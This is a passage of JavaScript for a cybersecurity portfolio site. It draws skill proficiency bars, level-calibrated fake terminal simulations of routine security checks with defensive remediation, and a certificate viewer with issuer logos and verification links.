      { label: 'Newbie',     pct: 20 },
      { label: 'Basic',      pct: 40 },
      { label: 'Working',    pct: 60 },
      { label: 'Pro',        pct: 80 },
      { label: 'Expert',     pct: 100 }
    ];
    return `
      <div class="radar-wrap">
        <div class="skill-modal-head" style="margin-bottom:16px">
          <span class="skill-modal-name">${escapeHtmlS(skill.name)} — proficiency radar</span>
          <span class="skill-modal-lvl">${cap.toUpperCase()}</span>
        </div>
        <div class="radar-bars">
          ${tiers.map((t, i) => {
            const active = t.pct <= pct;
            const isCurrent = (i === Math.floor(pct / 20) - (pct % 20 === 0 ? 1 : 0)) || (pct === 100 && i === tiers.length - 1);
            return `
              <div class="radar-bar ${active ? 'active' : ''} ${isCurrent ? 'current' : ''}">
                <div class="radar-bar-fill" style="height:${active ? Math.max(20, t.pct) : 8}px"></div>
                <div class="radar-bar-lbl">${t.label}</div>
                <div class="radar-bar-pct">${t.pct}%</div>
              </div>
            `;
          }).join('')}
        </div>
        <div class="radar-summary">
          <div class="radar-summary-line">
            <span class="rs-key">CURRENT_LEVEL</span>
            <span class="rs-val" style="color:var(--neon)">${cap}</span>
          </div>
          <div class="radar-summary-line">
            <span class="rs-key">MASTERY_PCT</span>
            <span class="rs-val">${pct}%</span>
          </div>
          <div class="radar-summary-line">
            <span class="rs-key">NEXT_MILESTONE</span>
            <span class="rs-val" style="color:var(--neon-2)">${nextMilestone(pct, cap)}</span>
          </div>
        </div>
        <div class="radar-descriptor">
          <strong style="color:var(--neon-2)">Simulation calibrated to level:</strong>
          <span>${levelDescriptor(lvl)}</span>
        </div>
      </div>
    `;
  }

  function nextMilestone(pct, cap) {
    if (pct >= 100) return 'Maintain and teach others';
    if (pct >= 80)  return 'Expert (100%) — set standards, review peers';
    if (pct >= 60)  return 'Advanced (80%) — own end-to-end workflows';
    if (pct >= 40)  return 'Pro (60%) — troubleshoot independently';
    if (pct >= 20)  return 'Working (40%) — comfortable in production';
    return 'Basic (20%) — operate with documentation';
  }

  // ---- Tab 3: LIVE SIMULATION (generic, level-calibrated) ----
  // Used when no specific SKILL_SIMS[key] exists. Generates a realistic
  // work-environment CLI/config/activity simulation mentioning the skill.
  function genericLiveSim(skill, host) {
    const lvl = (skill.level || '').toLowerCase();
    const cap = lvl.charAt(0).toUpperCase() + lvl.slice(1);
    const name = skill.name;
    const slug = name.toLowerCase().replace(/[^a-z0-9]+/g, '_');

    // The simulation scenario scales with level:
    //   beginner     → guided exploration
    //   intermediate → typical daily workflow
    //   advanced     → multi-step investigation with findings
    //   expert       → complex scenario + remediation + mentoring note
    const scenario = buildScenario(name, lvl);
    host.innerHTML = `
      <div class="sim-h">${escapeHtmlS(name).toUpperCase()} — LIVE SIMULATION (${cap.toUpperCase()})</div>
      <div class="sim-p">${scenario.intro}</div>
      ${scenario.preBlock || ''}
      <div class="term" id="generic-live-${slug}"></div>
      ${scenario.postBlock || ''}
      <div class="sim-p" style="margin-top:14px;font-size:11px;color:var(--fg-dim);line-height:1.6">
        <strong style="color:var(--neon-2)">Level calibration:</strong> ${levelDescriptor(lvl)}
      </div>
    `;
    attachTerminal($('#generic-live-' + slug, host), scenario.lines, { speed: 14, linePause: 110 });
  }

  // Build a level-appropriate scenario (CLI lines + intro + optional blocks)
  function buildScenario(name, lvl) {
    const t = ts();
    // Base scenario per level
    if (lvl === 'beginner') {
      return {
        intro: `Guided exploration of <strong>${escapeHtmlS(name)}</strong> — beginner workflow with documentation support.`,
        lines: [
          `$ # ${name} — beginner walkthrough`,
          `$ man ${name.toLowerCase().replace(/\s+/g, '-')}`,
          '[doc] NAME',
          `[doc]   ${name} — overview and basic usage`,
          '[doc] SYNOPSIS',
          `[doc]   ${name.toLowerCase().replace(/\s+/g, '-')} [options] <args>`,
          '$ # Step 1: identify version',
          `$ ${name.toLowerCase().replace(/\s+/g, '-')} --version`,
          `[ok] ${name} v1.0.2 (installed)`,
          '$ # Step 2: run basic operation with help',
          `$ ${name.toLowerCase().replace(/\s+/g, '-')} --help`,
          '[ok] available subcommands: list, show, test, scan',
          '$ # Step 3: execute a basic test',
          `$ ${name.toLowerCase().replace(/\s+/g, '-')} test --dry-run`,
          '[ok] dry-run completed — no side effects',
          '$ # Read documentation before moving to intermediate workflows.'
        ]
      };
    }
    if (lvl === 'intermediate') {
      return {
        intro: `Typical daily workflow using <strong>${escapeHtmlS(name)}</strong> — independent troubleshooting in a production-like environment.`,
        lines: [
          `$ # ${name} — daily workflow @ ${t}`,
          `$ ${name.toLowerCase().replace(/\s+/g, '-')} status`,
          `[ok] service healthy | uptime 14d | 2 active sessions`,
          '$ # Identify target',
          '$ TARGET=192.168.56.103',
          `$ ${name.toLowerCase().replace(/\s+/g, '-')} inspect $TARGET`,
          '[*] inspecting target...',
          `[ok] reachable | latency 4.2ms | fingerprint: linux 5.x`,
          '$ # Run standard checks',
          `$ ${name.toLowerCase().replace(/\s+/g, '-')} check --verbose $TARGET`,
          '[*] running 6 checks...',
          '[ok] config_baseline    PASS',
          '[ok] auth_mechanism      PASS',
          '[warn] tls_version       TLSv1.2 (consider TLSv1.3)',
          '[ok] log_level           PASS',
          '[ok] timeout_policy      PASS',
          '[warn] default_credentials  review recommended',
          '$ # Investigate warning',
          `$ ${name.toLowerCase().replace(/\s+/g, '-')} trace --filter warn $TARGET`,
          '[*] warning traced to config file /etc/default/cfg',
          '[ok] remediation suggestion logged in /tmp/findings.log',
          '$ # Workflow complete — 2 warnings, 0 critical'
        ]
      };
    }
    if (lvl === 'advanced') {
      return {
        intro: `Advanced scenario with <strong>${escapeHtmlS(name)}</strong> — multi-step investigation ending in findings and a remediation proposal.`,
        lines: [
          `$ # ${name} — advanced investigation @ ${t}`,
          `$ ${name.toLowerCase().replace(/\s+/g, '-')} --batch --target 192.168.56.0/24`,
          '[*] mapping target range (256 addresses)...',
          '[+] 12 hosts up | 4 listening on the relevant port',
          '$ # Deep inspection of the 4 candidates',
          `$ ${name.toLowerCase().replace(/\s+/g, '-')} probe --deep --targets 192.168.56.103,192.168.56.110,192.168.56.115,192.168.56.121`,
          '[*] probing...',
          '[!] 192.168.56.103 — anomalous response pattern detected',
          '[!] 192.168.56.110 — unexpected service on port 7547',
          '$ # Correlate with logs',
          `$ ${name.toLowerCase().replace(/\s+/g, '-')} logs --since 24h --grep "192.168.56.103"`,
          '[+] 47 matching events in the last 24h',
          '[!] beacon pattern every 60.0s — likely C2 channel',
          '$ # Capture evidence',
          `$ ${name.toLowerCase().replace(/\s+/g, '-')} capture --host 192.168.56.103 --out /tmp/evidence.pcap`,
          '[ok] evidence saved (47 KB) | hash sha256=4f8c...e201',
          '$ # Generate findings report',
          `$ ${name.toLowerCase().replace(/\s+/g, '-')} report --out /tmp/findings.md`,
          '[ok] report generated:',
          '[ok]   - 1 CRITICAL: C2 beacon on 192.168.56.103:443',
          '[ok]   - 1 HIGH:     unexpected service on .110:7547',
          '[ok]   - 2 MEDIUM:  TLS misconfig, weak ciphers',
          '$ # Recommended remediation:',
          '$ #   1. Isolate 192.168.56.103 from the LAN',
          '$ #   2. Block outbound 443 to attacker IP at the perimeter',
          '$ #   3. Reset credentials on the affected host',
          '$ #   4. Re-image + re-deploy with hardened baseline'
        ]
      };
    }
    if (lvl === 'expert') {
      return {
        intro: `Expert-level scenario with <strong>${escapeHtmlS(name)}</strong> — novel situation requiring standards-setting decisions and peer review.`,
        lines: [
          `$ # ${name} — expert scenario @ ${t}`,
          `$ ${name.toLowerCase().replace(/\s+/g, '-')} --audit --strict --target enterprise-lab`,
          '[*] running 247 audit controls across 18 systems...',
          '[ok] 184 PASS | 38 WARN | 21 FAIL | 4 UNKNOWN',
          '$ # Triage the 21 failures',
          `$ ${name.toLowerCase().replace(/\s+/g, '-')} failures --group-by control-family`,
          '[!] Access Control (AC):    7 failures',
          '[!] Audit & Accountability: 5 failures',
          '[!] Configuration Mgmt:     6 failures',
          '[!] Identification & Auth:  3 failures',
          '$ # Root-cause analysis on the AC cluster',
          `$ ${name.toLowerCase().replace(/\s+/g, '-')} root-cause --family AC --depth 4`,
          '[*] tracing dependency graph...',
          '[!] shared root cause: orphaned accounts from 2 legacy services',
          '[!] recommendation: implement automated deprovisioning via SCIM',
          '$ # Architect the fix',
          `$ ${name.toLowerCase().replace(/\s+/g, '-')} plan --fix orphaned-accounts --strategy scim-automation`,
          '[ok] remediation plan:',
          '[ok]   - Phase 1: integrate SCIM provider (2 sprints)',
          '[ok]   - Phase 2: dry-run reconciliation (1 sprint)',
          '[ok]   - Phase 3: cutover + monitor (2 sprints)',
          '$ # Document the new standard for the team',
          `$ ${name.toLowerCase().replace(/\s+/g, '-')} doc --out docs/standards/orphaned-accounts.md`,
          '[ok] standard drafted — submit for peer review',
          '$ # Schedule the peer review session',
          '$ # Mentor note: walk 2 engineers through this scenario next week'
        ]
      };
    }
    return { intro: `Simulation for ${escapeHtmlS(name)}.`, lines: [`$ # ${name}`] };
  }

  // =========================================================================
  //  CERT VIEW — shown when a cert card is clicked.
  //  Displays: full cert picture + description + issuer/date + VERIFY button
  //  VERIFY button is the ONLY external navigation.
  // =========================================================================
  function certViewSim(cert, host) {
    const issuerLogo = issuerLogoForCert(cert);
    const issuerC = issuerCertif(cert);
    host.innerHTML = `
      <div class="cert-view-grid">
        <div class="cert-view-image-block">
          <div class="skill-modal-head">
            <span class="skill-modal-name">certificate_image</span>
            <span class="skill-modal-lvl" style="border-color:var(--neon-3);color:var(--neon-3)">VERIFIED</span>
          </div>
          <div class="cert-image-frame">
            <img src="${issuerC}" alt="${escapeHtmlS(cert.title)} certificate image" loading="lazy" onerror="this.onerror=null;this.src='${fb(CERT_FALLBACK, issuerC, 'assets/certificates/google-cybersecurity.svg')}'" />
            <div class="cert-image-corner ctc-tl"></div>
            <div class="cert-image-corner ctc-tr"></div>
            <div class="cert-image-corner ctc-bl"></div>
            <div class="cert-image-corner ctc-br"></div>
          </div>
        </div>
        <div class="cert-view-info-block">
          <div class="skill-modal-head">
            <span class="skill-modal-name">${escapeHtmlS(cert.title)}</span>
          </div>
          <div class="cert-view-issuer-row">
            <img src="${issuerLogo}" alt="${escapeHtmlS(cert.issuer)} logo" class="cert-view-issuer-logo" loading="lazy" onerror="this.onerror=null;this.src='${fb(LOGO_FALLBACK, issuerLogo, 'assets/issuer-logos/google.svg')}'" />
            <div>
              <div class="cv-issuer-name">${escapeHtmlS(cert.issuer)}</div>
              <div class="cv-issue-date">Issued: ${escapeHtmlS(cert.date)}</div>
            </div>
          </div>
          <div class="cert-view-desc">
            <div class="cvd-label">// DESCRIPTION</div>
            <p class="cvd-text">${escapeHtmlS(cert.blurb || 'No description available for this certification.')}</p>
          </div>
          <div class="cert-view-meta">
            <div class="cvm-row">
              <span class="cvm-key">RECIPIENT</span>
              <span class="cvm-val">Souhaieb Marzouk</span>
            </div>
            <div class="cvm-row">
              <span class="cvm-key">ISSUE_DATE</span>
              <span class="cvm-val">${escapeHtmlS(cert.date)}</span>
            </div>
            <div class="cvm-row">
              <span class="cvm-key">ISSUING_BODY</span>
              <span class="cvm-val">${escapeHtmlS(cert.issuer)}</span>
            </div>
            <div class="cvm-row">
              <span class="cvm-key">VERIFY_URL</span>
              <span class="cvm-val" style="word-break:break-all;font-size:10px">${escapeHtmlS(cert.verifyUrl || '—')}</span>
            </div>
          </div>
          <a class="cert-view-verify-btn" href="${escapeHtmlS(cert.verifyUrl || '#')}" target="_blank" rel="noopener noreferrer">
            <span>VERIFY_CERTIFICATE</span>
            <span class="arrow">↗</span>
          </a>
          <div class="sim-p" style="margin-top:10px;font-size:10px;color:var(--fg-dim);line-height:1.5">
            // External verification link opens in a new tab.
          </div>
        </div>
      </div>
    `;
  }

  /* SVG fallbacks (used automatically when local PNG/JPG assets are absent) */
  const LOGO_FALLBACK = {
    'assets/issuer-logos/HTB-Logo.png':     'assets/issuer-logos/htb.svg',
    'assets/issuer-logos/Comptia-Logo.png': 'assets/issuer-logos/comptia.svg',
    'assets/issuer-logos/THM-Logo.jpg':     'assets/issuer-logos/tryhackme.svg',
    'assets/issuer-logos/Google-Logo.png':  'assets/issuer-logos/google.svg',
    'assets/issuer-logos/ATSQA-Logo.jpeg':  'assets/issuer-logos/atsqa.svg'
  };
  const CERT_FALLBACK = {
    'assets/certificates/HTB-CDSA.png':            'assets/certificates/htb-cdsa.svg',
    'assets/certificates/Network+.png':            'assets/certificates/comptia-network-plus.svg',
    'assets/certificates/Security+.png':           'assets/certificates/comptia-security-plus.svg',
    'assets/certificates/Cyber-Security-101.png':  'assets/certificates/thm-cyber-101.svg',
    'assets/certificates/Jr-PenTester.png':        'assets/certificates/thm-jr-pentester.svg',
    'assets/certificates/SOC-L1.png':              'assets/certificates/thm-soc-l1.svg',
    'assets/certificates/SOC-L2.png':              'assets/certificates/thm-soc-l2.svg',
    'assets/certificates/Google-Cybersecurity.png':'assets/certificates/google-cybersecurity.svg',
    'assets/certificates/CTFL.png':                'assets/certificates/istqb-ctfl.svg',
    'assets/certificates/CTFL-AT.png':             'assets/certificates/istqb-ctfl-at.svg'
  };
  function fb(map, src, dflt) { return map[src] || dflt; }

  function issuerLogoForCert(cert) {
    const m = {
      htb:       'assets/issuer-logos/HTB-Logo.png',
      comptia:   'assets/issuer-logos/Comptia-Logo.png',
      tryhackme: 'assets/issuer-logos/THM-Logo.jpg',
      google:    'assets/issuer-logos/Google-Logo.png',
      atsqa:     'assets/issuer-logos/ATSQA-Logo.jpeg'
    };
    if (cert.issuerKey && m[cert.issuerKey]) return m[cert.issuerKey];
    const byName = {
      'HackTheBox':       'assets/issuer-logos/HTB-Logo.png',
      'CompTIA':          'assets/issuer-logos/Comptia-Logo.png',
      'TryHackMe':        'assets/issuer-logos/THM-Logo.jpg',
      'Google / Coursera':'assets/issuer-logos/Google-Logo.png',
      'AT*SQA':           'assets/issuer-logos/ATSQA-Logo.jpeg'
    };
    return byName[cert.issuer] || 'assets/issuer-logos/Google-Logo.png';
  }
  function issuerCertif(cert) {
    const m = {
      htb:       'assets/certificates/HTB-CDSA.png',
      compnet:   'assets/certificates/Network+.png',
      compsec:   'assets/certificates/Security+.png',
      thm101: 'assets/certificates/Cyber-Security-101.png',
      thmjrpentest: 'assets/certificates/Jr-PenTester.png',
      thmsocl1: 'assets/certificates/SOC-L1.png',
      thmsocl2: 'assets/certificates/SOC-L2.png',
      google:    'assets/certificates/Google-Cybersecurity.png',
      ctfl:     'assets/certificates/CTFL.png',
      ctflat:     'assets/certificates/CTFL-AT.png'
    };
    if (cert.issuerKey && m[cert.issuerKey]) return m[cert.issuerKey];
    const byName = {
          'HTB Certified Defensive Security Analyst (CDSA)':    'assets/certificates/HTB-CDSA.png',
      'CompTIA Network+ (N10-009)':     'assets/certificates/Network+.png',
      'CompTIA Security+ (SY0-701)':    'assets/certificates/Security+.png',
      'Cyber Security 101':     'assets/certificates/Cyber-Security-101.png',
      'Jr Penetration Tester':  'assets/certificates/Jr-PenTester.png',
      'SOC Level 1':    'assets/certificates/SOC-L1.png',
      'SOC Level 2':    'assets/certificates/SOC-L2.png',
      'Google Cybersecurity Professional Certificate':  'assets/certificates/Google-Cybersecurity.png',
      'ISTQB Certified Tester Foundation Level (CTFL)': 'assets/certificates/CTFL.png',
      'ISTQB Certified Tester Foundation Level — Agile Tester (CTFL-AT)':       'assets/certificates/CTFL-AT.png'
    };
    return byName[cert.title] || 'assets/certificates/Google-Logo.png';
  }

  /* =================================================================
   *  PUBLIC API
   * ================================================================= */
  window.SIMULATIONS = {
    render: function (key, host, ctx) {
      // cleanup previous
      if (host.__cleanup) { host.__cleanup(); host.__cleanup = null; }
      ctx = ctx || {};
      ctx.tabs = ctx.tabs || [];

      // 1. CERT VIEW — clicking a certification card
      if (key === '__cert_view__' && ctx.cert) {
        certViewSim(ctx.cert, host);
        return;
      }

      // 2. SKILL SIM — always produce 3 tabs (sources / radar / live-sim)
      if (ctx.skill) {
        const skill = ctx.skill;
        const liveRenderer = (typeof key === 'string' && SKILL_SIMS[key]) ? SKILL_SIMS[key] : genericLiveSim;

        // push 3 tabs
        ctx.tabs.push(
          { id: 'sources',  label: '// SOURCES' },
          { id: 'radar',    label: '// PROFICIENCY' },
          { id: 'live-sim', label: '// LIVE SIMULATION' }
        );

        // build 3 sections; live-sim section will be filled by the renderer
        host.innerHTML = `
          <div class="sim-section active" data-sim="sources">
            ${renderSourcesSection(skill)}
          </div>
          <div class="sim-section" data-sim="radar">
            ${renderRadarSection(skill)}
          </div>
          <div class="sim-section" data-sim="live-sim">
            <!-- live sim renderer fills this in -->
          </div>
        `;

        const liveHost = host.querySelector('[data-sim="live-sim"]');
        if (liveHost) {
          // Specific skill sims take only (host); genericLiveSim takes (skill, host)
          if (liveRenderer === genericLiveSim) {
            genericLiveSim(skill, liveHost);
          } else {
            liveRenderer(liveHost);
          }
        }
        return;
      }

      // 3. EXPERIENCE / PROJECT simulations
      if (SIMS[key]) {
        SIMS[key](host, ctx);
        return;
      }

      host.innerHTML = `<div class="sim-p">Simulation not configured for this entry. Add a renderer in <span class="code-inline">simulations.js</span> for key <span class="code-inline">${key}</span>.</div>`;
    }
  };

})();
